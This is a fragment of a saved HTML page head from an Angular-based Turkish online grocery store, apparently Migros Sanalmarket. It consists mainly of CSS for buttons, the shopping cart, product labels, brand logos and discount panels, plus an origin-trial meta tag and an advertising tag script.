        --mdc-elevation-box-shadow-for-gss: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
        box-shadow: var(--mdc-protected-button-container-elevation, var(--mdc-elevation-box-shadow-for-gss))
      }

      .mat-mdc-raised-button:not(:disabled) {
        background-color: var(--mdc-protected-button-container-color, transparent)
      }

      .mat-mdc-raised-button:disabled {
        background-color: var(--mdc-protected-button-disabled-container-color, rgba(0, 0, 0, 0.12))
      }

      .mat-mdc-raised-button:not(:disabled) {
        color: var(--mdc-protected-button-label-text-color, inherit)
      }

      .mat-mdc-raised-button:disabled {
        color: var(--mdc-protected-button-disabled-label-text-color, rgba(0, 0, 0, 0.38))
      }

      .mat-mdc-raised-button .mdc-button__ripple {
        border-radius: var(--mdc-protected-button-container-shape, var(--mdc-shape-small, 4px))
      }

      .mat-mdc-raised-button.mdc-ripple-upgraded--background-focused,
      .mat-mdc-raised-button:not(.mdc-ripple-upgraded):focus {
        --mdc-elevation-box-shadow-for-gss: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
        box-shadow: var(--mdc-protected-button-focus-container-elevation, var(--mdc-elevation-box-shadow-for-gss))
      }

      .mat-mdc-raised-button:hover {
        --mdc-elevation-box-shadow-for-gss: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
        box-shadow: var(--mdc-protected-button-hover-container-elevation, var(--mdc-elevation-box-shadow-for-gss))
      }

      .mat-mdc-raised-button:not(:disabled):active {
        --mdc-elevation-box-shadow-for-gss: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12);
        box-shadow: var(--mdc-protected-button-pressed-container-elevation, var(--mdc-elevation-box-shadow-for-gss))
      }

      .mat-mdc-raised-button:disabled {
        --mdc-elevation-box-shadow-for-gss: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12);
        box-shadow: var(--mdc-protected-button-disabled-container-elevation, var(--mdc-elevation-box-shadow-for-gss))
      }

      .mat-mdc-outlined-button {
        height: var(--mdc-outlined-button-container-height, 36px);
        border-radius: var(--mdc-outlined-button-container-shape, var(--mdc-shape-small, 4px));
        padding: 0 15px 0 15px;
        border-width: var(--mdc-outlined-button-outline-width, 1px)
      }

      .mat-mdc-outlined-button:not(:disabled) {
        color: var(--mdc-outlined-button-label-text-color, inherit)
      }

      .mat-mdc-outlined-button:disabled {
        color: var(--mdc-outlined-button-disabled-label-text-color, rgba(0, 0, 0, 0.38))
      }

      .mat-mdc-outlined-button .mdc-button__ripple {
        border-radius: var(--mdc-outlined-button-container-shape, var(--mdc-shape-small, 4px))
      }

      .mat-mdc-outlined-button:not(:disabled) {
        border-color: var(--mdc-outlined-button-outline-color, rgba(0, 0, 0, 0.12))
      }

      .mat-mdc-outlined-button:disabled {
        border-color: var(--mdc-outlined-button-disabled-outline-color, rgba(0, 0, 0, 0.12))
      }

      .mat-mdc-outlined-button.mdc-button--icon-trailing {
        padding: 0 11px 0 15px
      }

      .mat-mdc-outlined-button.mdc-button--icon-leading {
        padding: 0 15px 0 11px
      }

      .mat-mdc-outlined-button .mdc-button__ripple {
        top: -1px;
        left: -1px;
        bottom: -1px;
        right: -1px;
        border-width: var(--mdc-outlined-button-outline-width, 1px)
      }

      .mat-mdc-outlined-button .mdc-button__touch {
        left: calc(-1 * var(--mdc-outlined-button-outline-width, 1px));
        width: calc(100% + 2 * var(--mdc-outlined-button-outline-width, 1px))
      }

      .mat-mdc-button .mat-mdc-button-ripple,
      .mat-mdc-button .mat-mdc-button-persistent-ripple,
      .mat-mdc-button .mat-mdc-button-persistent-ripple::before,
      .mat-mdc-unelevated-button .mat-mdc-button-ripple,
      .mat-mdc-unelevated-button .mat-mdc-button-persistent-ripple,
      .mat-mdc-unelevated-button .mat-mdc-button-persistent-ripple::before,
      .mat-mdc-raised-button .mat-mdc-button-ripple,
      .mat-mdc-raised-button .mat-mdc-button-persistent-ripple,
      .mat-mdc-raised-button .mat-mdc-button-persistent-ripple::before,
      .mat-mdc-outlined-button .mat-mdc-button-ripple,
      .mat-mdc-outlined-button .mat-mdc-button-persistent-ripple,
      .mat-mdc-outlined-button .mat-mdc-button-persistent-ripple::before {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none;
        border-radius: inherit
      }

      .mat-mdc-button .mat-mdc-button-persistent-ripple::before,
      .mat-mdc-unelevated-button .mat-mdc-button-persistent-ripple::before,
      .mat-mdc-raised-button .mat-mdc-button-persistent-ripple::before,
      .mat-mdc-outlined-button .mat-mdc-button-persistent-ripple::before {
        content: "";
        opacity: 0;
        background-color: var(--mat-mdc-button-persistent-ripple-color)
      }

      .mat-mdc-button .mat-ripple-element,
      .mat-mdc-unelevated-button .mat-ripple-element,
      .mat-mdc-raised-button .mat-ripple-element,
      .mat-mdc-outlined-button .mat-ripple-element {
        background-color: var(--mat-mdc-button-ripple-color)
      }

      .mat-mdc-button .mdc-button__label,
      .mat-mdc-unelevated-button .mdc-button__label,
      .mat-mdc-raised-button .mdc-button__label,
      .mat-mdc-outlined-button .mdc-button__label {
        z-index: 1
      }

      .mat-mdc-button .mat-mdc-focus-indicator,
      .mat-mdc-unelevated-button .mat-mdc-focus-indicator,
      .mat-mdc-raised-button .mat-mdc-focus-indicator,
      .mat-mdc-outlined-button .mat-mdc-focus-indicator {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute
      }

      .mat-mdc-button:focus .mat-mdc-focus-indicator::before,
      .mat-mdc-unelevated-button:focus .mat-mdc-focus-indicator::before,
      .mat-mdc-raised-button:focus .mat-mdc-focus-indicator::before,
      .mat-mdc-outlined-button:focus .mat-mdc-focus-indicator::before {
        content: ""
      }

      .mat-mdc-button[disabled],
      .mat-mdc-unelevated-button[disabled],
      .mat-mdc-raised-button[disabled],
      .mat-mdc-outlined-button[disabled] {
        cursor: default;
        pointer-events: none
      }

      .mat-mdc-button .mat-mdc-button-touch-target,
      .mat-mdc-unelevated-button .mat-mdc-button-touch-target,
      .mat-mdc-raised-button .mat-mdc-button-touch-target,
      .mat-mdc-outlined-button .mat-mdc-button-touch-target {
        position: absolute;
        top: 50%;
        height: 48px;
        left: 0;
        right: 0;
        transform: translateY(-50%)
      }

      .mat-mdc-button._mat-animation-noopable,
      .mat-mdc-unelevated-button._mat-animation-noopable,
      .mat-mdc-raised-button._mat-animation-noopable,
      .mat-mdc-outlined-button._mat-animation-noopable {
        transition: none !important;
        animation: none !important
      }

      .mat-mdc-button>.mat-icon {
        margin-left: 0;
        margin-right: 8px;
        display: inline-block;
        position: relative;
        vertical-align: top;
        font-size: 1.125rem;
        height: 1.125rem;
        width: 1.125rem
      }

      [dir=rtl] .mat-mdc-button>.mat-icon,
      .mat-mdc-button>.mat-icon[dir=rtl] {
        margin-left: 8px;
        margin-right: 0
      }

      .mat-mdc-button .mdc-button__label+.mat-icon {
        margin-left: 8px;
        margin-right: 0
      }

      [dir=rtl] .mat-mdc-button .mdc-button__label+.mat-icon,
      .mat-mdc-button .mdc-button__label+.mat-icon[dir=rtl] {
        margin-left: 0;
        margin-right: 8px
      }

      .mat-mdc-unelevated-button>.mat-icon,
      .mat-mdc-raised-button>.mat-icon,
      .mat-mdc-outlined-button>.mat-icon {
        margin-left: 0;
        margin-right: 8px;
        display: inline-block;
        position: relative;
        vertical-align: top;
        font-size: 1.125rem;
        height: 1.125rem;
        width: 1.125rem;
        margin-left: -4px;
        margin-right: 8px
      }

      [dir=rtl] .mat-mdc-unelevated-button>.mat-icon,
      [dir=rtl] .mat-mdc-raised-button>.mat-icon,
      [dir=rtl] .mat-mdc-outlined-button>.mat-icon,
      .mat-mdc-unelevated-button>.mat-icon[dir=rtl],
      .mat-mdc-raised-button>.mat-icon[dir=rtl],
      .mat-mdc-outlined-button>.mat-icon[dir=rtl] {
        margin-left: 8px;
        margin-right: 0
      }

      [dir=rtl] .mat-mdc-unelevated-button>.mat-icon,
      [dir=rtl] .mat-mdc-raised-button>.mat-icon,
      [dir=rtl] .mat-mdc-outlined-button>.mat-icon,
      .mat-mdc-unelevated-button>.mat-icon[dir=rtl],
      .mat-mdc-raised-button>.mat-icon[dir=rtl],
      .mat-mdc-outlined-button>.mat-icon[dir=rtl] {
        margin-left: 8px;
        margin-right: -4px
      }

      .mat-mdc-unelevated-button .mdc-button__label+.mat-icon,
      .mat-mdc-raised-button .mdc-button__label+.mat-icon,
      .mat-mdc-outlined-button .mdc-button__label+.mat-icon {
        margin-left: 8px;
        margin-right: -4px
      }

      [dir=rtl] .mat-mdc-unelevated-button .mdc-button__label+.mat-icon,
      [dir=rtl] .mat-mdc-raised-button .mdc-button__label+.mat-icon,
      [dir=rtl] .mat-mdc-outlined-button .mdc-button__label+.mat-icon,
      .mat-mdc-unelevated-button .mdc-button__label+.mat-icon[dir=rtl],
      .mat-mdc-raised-button .mdc-button__label+.mat-icon[dir=rtl],
      .mat-mdc-outlined-button .mdc-button__label+.mat-icon[dir=rtl] {
        margin-left: -4px;
        margin-right: 8px
      }

      .mat-mdc-outlined-button .mat-mdc-button-ripple,
      .mat-mdc-outlined-button .mdc-button__ripple {
        top: -1px;
        left: -1px;
        bottom: -1px;
        right: -1px;
        border-width: -1px
      }

      .mat-mdc-unelevated-button .mat-mdc-focus-indicator::before,
      .mat-mdc-raised-button .mat-mdc-focus-indicator::before {
        margin: calc(calc(var(--mat-mdc-focus-indicator-border-width, 3px) + 2px) * -1)
      }

      .mat-mdc-outlined-button .mat-mdc-focus-indicator::before {
        margin: calc(calc(var(--mat-mdc-focus-indicator-border-width, 3px) + 3px) * -1)
      }
    </style>
    <style>
      .cdk-high-contrast-active .mat-mdc-button:not(.mdc-button--outlined),
      .cdk-high-contrast-active .mat-mdc-unelevated-button:not(.mdc-button--outlined),
      .cdk-high-contrast-active .mat-mdc-raised-button:not(.mdc-button--outlined),
      .cdk-high-contrast-active .mat-mdc-outlined-button:not(.mdc-button--outlined),
      .cdk-high-contrast-active .mat-mdc-icon-button {
        outline: solid 1px
      }
    </style>
    <meta http-equiv="origin-trial" content="AwnOWg2dzaxHPelVjqOT/Y02cSxnG2FkjXO7DlX9VZF0eyD0In8IIJ9fbDFZGXvxNvn6HaF51qFHycDGLOkj1AUAAACAeyJvcmlnaW4iOiJodHRwczovL2NyaXRlby5jb206NDQzIiwiZmVhdHVyZSI6IlByaXZhY3lTYW5kYm94QWRzQVBJcyIsImV4cGlyeSI6MTY5NTE2Nzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      [_nghost-isc-c347] {
        display: block;
        position: absolute;
        top: 63px;
        right: 0;
        box-shadow: 0 0 10px #00000026;
        overflow: hidden;
        border-radius: 10px;
        padding: 1rem;
        width: 390px;
        background-color: #fff;
        z-index: 2;
        cursor: default;
        animation: presence .15s ease-in-out
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] {
        max-height: 310px;
        overflow-y: scroll;
        margin-bottom: 4rem
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] {
        border-radius: 0 0 10px 10px;
        box-shadow: 0 0 10px #00000026;
        background-color: var(--basicColorWhite);
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        display: flex;
        align-items: center;
        padding: 1rem
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] .minimum-amount-wrapper[_ngcontent-isc-c347] {
        margin-right: 1rem;
        min-width: 200px
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] .minimum-amount-wrapper[_ngcontent-isc-c347] .icon-text-wrapper[_ngcontent-isc-c347] {
        display: flex;
        align-items: center;
        text-align: left
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] .minimum-amount-wrapper[_ngcontent-isc-c347] fa-icon[_ngcontent-isc-c347] {
        font-size: 1.3rem
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] .minimum-amount-wrapper[_ngcontent-isc-c347] span[_ngcontent-isc-c347] {
        margin-left: .5rem
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] .minimum-amount-wrapper[_ngcontent-isc-c347] .amount-bar-wrapper[_ngcontent-isc-c347] {
        width: 100%;
        height: .625rem;
        margin: .5rem .875rem 0 0;
        border-radius: 8.5px;
        background-color: var(--basicColor300)
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] .minimum-amount-wrapper[_ngcontent-isc-c347] .amount-bar-wrapper[_ngcontent-isc-c347] .amount-bar[_ngcontent-isc-c347] {
        width: 0;
        transition: width .2s ease-in-out 0s;
        height: 100%;
        border-radius: 8.5px;
        background-color: var(--systemColorSuccess600)
      }

      [_nghost-isc-c347] .cart-dropdown-wrapper[_ngcontent-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] button[_ngcontent-isc-c347] {
        border-radius: 5px;
        background-color: var(--brandColorPrimary700);
        height: 3rem;
        width: 100%;
        color: #fff;
        border: none;
        cursor: pointer;
        outline: none
      }

      .mion[_nghost-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] button[_ngcontent-isc-c347],
      .mion [_nghost-isc-c347] .minimum-amount-basket-wrapper[_ngcontent-isc-c347] button[_ngcontent-isc-c347] {
        color: var(--basicColor950) !important
      }
    </style>
    <style>
      .cart-dropdown-item[_ngcontent-isc-c346] {
        display: flex;
        margin: 0 0 1rem;
        padding-right: .75rem
      }

      .cart-dropdown-item[_ngcontent-isc-c346] fe-product-image[_ngcontent-isc-c346] {
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12);
        min-width: 4.875rem;
        min-height: 4.875rem;
        padding: .25rem;
        margin-right: 1rem
      }

      .cart-dropdown-item[_ngcontent-isc-c346] .detail-wrapper[_ngcontent-isc-c346] {
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        width: 100%
      }

      .cart-dropdown-item[_ngcontent-isc-c346] .detail-wrapper[_ngcontent-isc-c346] .name-delete-wrapper[_ngcontent-isc-c346] {
        display: flex;
        align-items: center;
        justify-content: space-between;
        color: var(--basicColor900)
      }

      .cart-dropdown-item[_ngcontent-isc-c346] .detail-wrapper[_ngcontent-isc-c346] .name-delete-wrapper[_ngcontent-isc-c346] .delete-button[_ngcontent-isc-c346] {
        cursor: pointer;
        color: var(--basicColor400);
        margin-bottom: .35rem
      }

      .cart-dropdown-item[_ngcontent-isc-c346] .detail-wrapper[_ngcontent-isc-c346] .actions-price-wrapper[_ngcontent-isc-c346] {
        display: flex;
        justify-content: space-between;
        align-items: flex-end
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      [_nghost-isc-c163] {
        display: block
      }

      h1[_ngcontent-isc-c163] {
        font: inherit;
        color: inherit
      }

      .migros[_ngcontent-isc-c163] {
        font-size: .75rem;
        font-weight: 600;
        font-stretch: normal;
        font-style: normal;
        line-height: 1.33;
        letter-spacing: normal;
        color: var(--basicColor900);
        display: inline-block;
        max-width: 230px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap
      }

      .text-decoration-ellipsis[_ngcontent-isc-c163] {
        overflow: hidden;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        text-overflow: ellipsis
      }

      .yemek[_nghost-isc-c163] h1[_ngcontent-isc-c163],
      .yemek [_nghost-isc-c163] h1[_ngcontent-isc-c163] {
        pointer-events: none
      }
    </style>
    <style>
      .product-labels[_ngcontent-isc-c344] {
        display: flex;
        grid-gap: .5rem;
        padding: .5rem 0
      }

      .product-labels[_ngcontent-isc-c344] .product-label[_ngcontent-isc-c344] {
        height: -moz-fit-content;
        height: fit-content;
        width: -moz-fit-content;
        width: fit-content;
        font-size: .625rem;
        text-align: center;
        padding: .125rem .5rem .125rem .438rem;
        border-radius: 4px;
        font-weight: 500
      }

      .product-labels[_ngcontent-isc-c344] .product-label.cross[_ngcontent-isc-c344] {
        color: var(--systemColorSuccess600);
        background-color: var(--systemColorSuccess50)
      }

      .product-labels[_ngcontent-isc-c344] .product-label.special[_ngcontent-isc-c344] {
        color: var(--basicColorWhite);
        background-color: #c93d5a
      }

      .product-labels[_ngcontent-isc-c344] .product-label.price[_ngcontent-isc-c344] {
        color: var(--basicColor900);
        background-color: #fdf2b7
      }

      .product-labels[_ngcontent-isc-c344] .product-label.new[_ngcontent-isc-c344] {
        color: var(--systemColorSuccess600);
        background-color: #f0fadc
      }

      .product-labels[_ngcontent-isc-c344] .product-label.tamim[_ngcontent-isc-c344] {
        background-color: var(--systemColorSuccess50);
        color: var(--systemColorSuccess600)
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      sm-cart-page {
        display: block
      }

      @media (max-width: 768px) {
        sm-cart-page {
          margin-bottom: 10rem
        }
      }

      sm-cart-page .cart-page {
        animation: presence .3s ease-in-out
      }

      sm-cart-page .cart-container {
        padding: 0 1rem;
        margin: 2.25rem 0
      }

      @media (min-width: 1200px) {
        sm-cart-page .cart-container {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        sm-cart-page .cart-container {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        sm-cart-page .cart-container {
          padding: 0 18rem
        }
      }

      @media (min-width: 1800px) {
        sm-cart-page .cart-container {
          padding: 0 23rem
        }
      }

      sm-cart-page .cart-container .product-list-wrapper-vwo {
        display: flex;
        flex-direction: column
      }

      sm-cart-page .cart-container .cart-banner-top {
        margin-bottom: 2.25rem
      }

      sm-cart-page .cart-container__header {
        display: flex;
        justify-content: space-between;
        margin-bottom: 1rem;
        align-items: center
      }

      sm-cart-page .cart-container__header .update-cart {
        cursor: pointer
      }

      @media (max-width: 768px) {
        sm-cart-page .cart-container__header .update-cart {
          display: none
        }
      }

      sm-cart-page .cart-container__header h2 {
        margin: 0
      }

      sm-cart-page .cart-container .product-list {
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12)
      }

      sm-cart-page .cart-container .product-list mat-list-option {
        min-height: 122px;
        height: auto
      }

      @media (max-width: 576px) {
        sm-cart-page .cart-container .product-list mat-list-option {
          min-height: 200px !important
        }

        sm-cart-page .cart-container .product-list mat-list-option .mdc-list-item__start {
          width: 30px;
          margin-left: 3px;
          margin-right: 0
        }
      }

      sm-cart-page .cart-container .product-list sm-cart-page-item+sm-cart-page-item {
        border-top: 1px solid rgba(0, 0, 0, .12)
      }

      sm-cart-page .cart-container .product-list mat-list-option+mat-list-option {
        border-top: 1px solid rgba(0, 0, 0, .12)
      }

      sm-cart-page .cart-container fe-line-checkout-summary,
      sm-cart-page .cart-container sm-alternative-product-choice,
      sm-cart-page .cart-container fe-campaign-banner-side-banner-card {
        margin-bottom: 1rem
      }

      sm-cart-page .cart-container fe-line-checkout-summary .side-banner-card,
      sm-cart-page .cart-container sm-alternative-product-choice .side-banner-card,
      sm-cart-page .cart-container fe-campaign-banner-side-banner-card .side-banner-card {
        border: none
      }

      sm-cart-page .cart-container .mdc-list {
        padding: 0
      }

      sm-cart-page .cart-container .mdc-list .mdc-list-item {
        height: 100%;
        padding-right: 0
      }

      sm-cart-page .cart-container .mdc-list .mdc-list-item__text {
        width: 100%
      }

      sm-cart-page .cart-container .mdc-list .mdc-list-item__graphic {
        margin: 0
      }

      @media (max-width: 576px) {
        sm-cart-page .cart-container .mdc-list .mdc-list-item__graphic {
          position: absolute;
          top: .5rem;
          left: .5rem
        }
      }

      sm-cart-page .cart-container .mdc-list .mat-mdc-list-item-interactive:before {
        z-index: 1
      }

      sm-cart-page .cart-container .edit-mode-actions {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1.5rem
      }

      sm-cart-page .cart-container .edit-mode-actions .select-all {
        cursor: pointer
      }

      sm-cart-page .cart-container .edit-mode-actions .delete-buttons button {
        background-color: var(--basicColor300);
        border-radius: 5px;
        font-size: .75rem;
        color: var(--basicColor900)
      }

      @media (max-width: 576px) {
        sm-cart-page .cart-container .edit-mode-actions .delete-buttons button {
          padding: .5rem
        }
      }

      sm-cart-page .cart-container .edit-mode-actions .delete-buttons .delete-all {
        margin-left: .5rem
      }

      sm-cart-page .price-left {
        display: flex;
        grid-gap: .625rem;
        padding: .75rem;
        align-items: center
      }

      @media (max-width: 768px) {
        sm-cart-page .price-left {
          border-bottom: 1px solid rgba(0, 0, 0, .12)
        }
      }

      sm-cart-page .cart-empty {
        text-align: center;
        display: flex;
        justify-content: center;
        align-items: center
      }

      sm-cart-page .cart-empty mat-card {
        padding: 3.5rem 4.5rem;
        align-items: center;
        box-shadow: none;
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12)
      }

      sm-cart-page .cart-empty mat-card img {
        width: 17.5rem
      }

      sm-cart-page .cart-empty mat-card .info {
        margin: 1.5rem 0 1rem
      }

      sm-cart-page .cart-empty mat-card button {
        height: 3.15rem;
        width: 10.75rem
      }

      @media (max-width: 768px) {
        sm-cart-page .cart-empty mat-card {
          padding: 1.5rem 1.5rem 3.5rem
        }
      }

      sm-cart-page .mat-mdc-list-item-interactive:before {
        background: transparent
      }

      @media (max-width: 576px) {
        sm-cart-page .recommendations-wrapper {
          margin-left: -1rem
        }
      }

      @media (min-width: 768px) {
        sm-cart-page sm-product-list-slider .section-title {
          font-size: 24px !important;
          font-weight: 600 !important;
          line-height: 1.5 !important
        }
      }

      .hemen sm-cart-page .cart-empty mat-card {
        box-shadow: none
      }

      .hemen sm-cart-page .cart-container .edit-mode-actions .delete-buttons button {
        background-color: var(--basicColor300);
        color: var(--basicColor900)
      }

      .hemen sm-cart-page .cart-container .mdc-list .mdc-list-item {
        height: auto
      }

      .hemen sm-cart-page .cart-container .mat-mdc-list-item-interactive:before {
        background: transparent
      }

      .mion sm-cart-page .product-list.list .mat-primary .mat-pseudo-checkbox-checked {
        background: var(--basicColorBlack)
      }

      .mion sm-cart-page .product-list.list .mat-pseudo-checkbox:after {
        color: var(--basicColorYellow)
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .header-wrapper[_ngcontent-isc-c375] {
        border-bottom: 1px solid rgba(0, 0, 0, .12)
      }

      .header-wrapper[_ngcontent-isc-c375] .logo-container[_ngcontent-isc-c375] {
        padding: 0 1rem;
        display: flex;
        align-items: center;
        cursor: pointer;
        height: 4.375rem;
        background-repeat: no-repeat;
        background-origin: content-box;
        background-position: left
      }

      @media (min-width: 1200px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container[_ngcontent-isc-c375] {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container[_ngcontent-isc-c375] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container[_ngcontent-isc-c375] {
          padding: 0 18rem
        }
      }

      @media (min-width: 1800px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container[_ngcontent-isc-c375] {
          padding: 0 23rem
        }
      }

      .header-wrapper[_ngcontent-isc-c375] .logo-container.invisible[_ngcontent-isc-c375] {
        visibility: hidden
      }

      .header-wrapper[_ngcontent-isc-c375] .logo-container.sanalmarket[_ngcontent-isc-c375] {
        background-image: url(assets/logos/sanalmarket/sanalmarket-logo.svg)
      }

      @media (max-width: 576px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container.sanalmarket[_ngcontent-isc-c375] {
          background-image: url(assets/logos/sanalmarket/sanalmarket-logo-mobile.svg);
          background-size: unset;
          width: 5rem
        }
      }

      .header-wrapper[_ngcontent-isc-c375] .logo-container.elektronik[_ngcontent-isc-c375] {
        background-image: url(assets/logos/elektronik/ekstra-logo.svg);
        width: 7rem
      }

      @media (max-width: 576px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container.elektronik[_ngcontent-isc-c375] {
          background-image: url(assets/logos/elektronik/ekstra-logo-mobile.png);
          background-size: unset;
          width: 5rem
        }
      }

      .header-wrapper[_ngcontent-isc-c375] .logo-container.kurban[_ngcontent-isc-c375] {
        background-image: url(assets/logos/kurban/kurban-logo.svg);
        width: 7rem
      }

      @media (max-width: 576px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container.kurban[_ngcontent-isc-c375] {
          background-image: url(assets/logos/kurban/kurban-logo-mobile.svg);
          background-size: unset
        }
      }

      .header-wrapper[_ngcontent-isc-c375] .logo-container.yemek[_ngcontent-isc-c375] {
        background-image: url(assets/logos/yemek/yemek-logo.svg);
        background-size: 10rem
      }

      @media (max-width: 576px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container.yemek[_ngcontent-isc-c375] {
          background-size: 6rem
        }
      }

      .header-wrapper[_ngcontent-isc-c375] .logo-container.hemen[_ngcontent-isc-c375] {
        background-image: url(assets/logos/hemen/hemen-logo.svg);
        width: 7rem
      }

      @media (max-width: 576px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container.hemen[_ngcontent-isc-c375] {
          background-size: unset;
          width: 5rem
        }
      }

      .header-wrapper[_ngcontent-isc-c375] .logo-container.mion[_ngcontent-isc-c375] {
        background-image: url(assets/logos/mion/mion-logo.svg);
        background-size: 5rem
      }

      @media (max-width: 576px) {
        .header-wrapper[_ngcontent-isc-c375] .logo-container.mion[_ngcontent-isc-c375] {
          background-size: unset;
          width: 5rem
        }
      }
    </style>
    <script async="" src="https://tags.bluekai.com/site/83669?ret=js&amp;limit=1"></script>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .mion .special-discounts {
        background-color: var(--brandColorMion700)
      }

      sm-special-discount {
        display: block
      }

      sm-special-discount .special-discounts {
        width: 100%;
        background-color: #fef5eb;
        padding: 1.5rem 1rem
      }

      @media (min-width: 1200px) {
        sm-special-discount .special-discounts {
          padding: 1.5rem 7rem
        }
      }

      @media (min-width: 1440px) {
        sm-special-discount .special-discounts {
          padding: 1.5rem 11rem
        }
      }

      @media (min-width: 1600px) {
        sm-special-discount .special-discounts {
          padding: 1.5rem 18rem
        }
      }

      @media (min-width: 1800px) {
        sm-special-discount .special-discounts {
          padding: 1.5rem 23rem
        }
      }

      sm-special-discount .special-discounts-info {
        padding: 0 1rem
      }

      @media (min-width: 768px) {
        sm-special-discount .special-discounts-info {
          padding: 0 2.25rem
        }
      }

      sm-special-discount .special-discounts-info span {
        margin-bottom: .33rem;
        display: block
      }

      @media (min-width: 768px) {
        sm-special-discount .special-discounts-header {
          font-size: 1.125rem
        }
      }

      sm-special-discount .special-discounts-header-classic {
        display: inline
      }

      sm-special-discount .special-discounts-header-vwo {
        display: none
      }

      sm-special-discount .special-discounts h1 {
        padding: 1.5rem
      }

      sm-special-discount .special-discounts mat-expansion-panel {
        border-radius: 8px;
        box-shadow: none !important
      }

      sm-special-discount .special-discounts mat-expansion-panel-header.mat-expanded {
        height: unset;
        padding: 1.5rem
      }

      sm-special-discount .special-discounts mat-expansion-panel .mat-expansion-indicator {
        width: 1.5rem;
        height: 1.5rem;
        background-color: var(--basicColor200);
        border-radius: 50%;
        text-align: center;
        margin-top: -.25rem
      }

      @media (min-width: 768px) {
        sm-special-discount .special-discounts mat-expansion-panel .mat-expansion-indicator {
          width: 2.25rem;
          height: 2.25rem
        }

        sm-special-discount .special-discounts mat-expansion-panel .mat-expansion-indicator:after {
          padding: .25rem;
          margin-top: .5rem
        }
      }

      sm-special-discount .special-discounts mat-expansion-panel .mat-expansion-indicator:after {
        border-color: var(--basicColor900)
      }

      sm-special-discount .special-discounts mat-expansion-panel .mat-expansion-panel-body {
        padding: 0 0 1rem
      }

      sm-special-discount .special-discounts mat-expansion-panel [aria-expanded=false] {
        padding: 1.5rem;
        height: unset
      }

      sm-special-discount .special-discounts fe-carousel {
        height: -moz-fit-content;
        height: fit-content
      }

      @media (min-width: 768px) {
        sm-special-discount .special-discounts fe-carousel {
          padding-left: 1rem
        }
      }

      sm-special-discount .mdc-tab__text-label {
        line-height: 1.33 !important;
        margin-bottom: 0;
        max-width: 10rem;
        white-space: normal;
